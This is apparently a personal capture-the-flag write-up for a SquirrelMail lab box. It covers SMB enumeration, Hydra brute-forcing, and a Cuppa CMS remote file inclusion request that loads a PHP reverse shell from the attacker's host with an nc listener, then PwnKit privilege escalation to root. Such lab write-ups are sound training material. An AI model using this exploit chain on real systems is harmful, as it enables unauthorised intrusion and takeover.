 SquirrelMail 

 1. Recon 
- Port and service scanning: `nmap`
- Directory/file brute-forcing: `dirsearch`, `gobuster`
- Discovered **SquirrelMail**
- Found **SMB** → enumerated users and shares:
  - `enum4linux` → gathered usernames/info
  - `smbmap` → checked permissions, found `log1.txt`, `log2.txt`, `log3.txt`
- Extracted hints from logs for password brute-forcing

---

 2. Access & Authentication (self)
- Used **Hydra** for brute-forcing (usernames from `enum4linux` + `smbmap`)
- Verified login endpoint with **Burp Suite**
- Found valid passwords → logged into SMB with another user
- Discovered a text file with a hint about a hidden directory

---

 3. Web exploitation path (self)
- Navigated to the hidden directory → initially empty
- Ran `ffuf` → found `/administrator/`
- Identified **Cuppa CMS**
- Searched for exploits → found RFI vulnerability in `alertConfigField.php`

Exploit request:
```http
GET /administrator/alerts/alertConfigField.php?urlConfig=http://ip_addres:8080/php-reverse-shell.php
and use comand nc -nlvp 8080
 4. Privilege Escalation (self)

Ran linpeas.sh

Confirmed: Ubuntu 16 vulnerable to PwnKit (CVE-2021-4034)

Exploited PwnKit → privilege escalation successful

Result: root access

 5. Guided steps

After finding SquirrelMail, I followed a walkthrough for orientation

Everything else (SMB, ffuf, Cuppa CMS, reverse shell, PwnKit) was done independently

 6. Notes & Takeaways

With SMB, always run enum4linux + smbmap → often reveals users and useful files

Burp Suite helps not only for exploitation but also to confirm endpoints for Hydra

Older distros (like Ubuntu 16) → good candidates for quick PwnKit escalation

For CMS (e.g., Cuppa), it’s useful to keep a checklist of known vulnerable endpoints
